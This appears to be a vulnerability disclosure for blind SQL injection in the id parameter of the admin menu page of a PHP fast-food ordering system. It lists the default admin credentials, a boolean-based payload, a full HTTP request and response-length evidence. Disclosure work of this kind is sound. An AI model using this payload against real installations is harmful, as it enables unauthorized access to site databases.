# Fast Food Ordering System v1.0 by oretnom23 has SQL injection

The password for the backend login account is: admin/admin123

vendors: https://www.sourcecodester.com/php/15366/fast-food-ordering-system-phpoop-free-source-code.html

Vulnerability File: /ffos/admin/menus/manage_menu.php?id=

Vulnerability location: /ffos/admin/menus/manage_menu.php?id=, id

Current database name: ffos_db,length is 7

[+] Payload: /ffos/admin/menus/manage_menu.php?id=1%27%20and%20length(database())%20=7--+ // Leak place ---> id


```sql
GET /ffos/admin/menus/manage_menu.php?id=1%27%20and%20length(database())%20=7--+ HTTP/1.1
Host: 192.168.1.19
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
Cookie: PHPSESSID=rlr2a917ahfp4mc52mm9a7kvvm
Connection: close
```

When length (database ()) = 6, Content-Length: 3743
![image](https://user-images.githubusercontent.com/54017627/171352081-15db73c0-5dff-4050-9d99-4f019fd8edd9.png)

![image](https://user-images.githubusercontent.com/54017627/171351869-64d809ff-da2f-45b1-b3cb-922de4751a62.png)

When length (database ()) = 7, Content-Length: 3908
![image](https://user-images.githubusercontent.com/54017627/171352050-449f15b7-73e9-486b-9259-8f184f91fae6.png)

![image](https://user-images.githubusercontent.com/54017627/171351840-39e0f1a8-1a4d-4ed1-aec1-14527775c190.png)
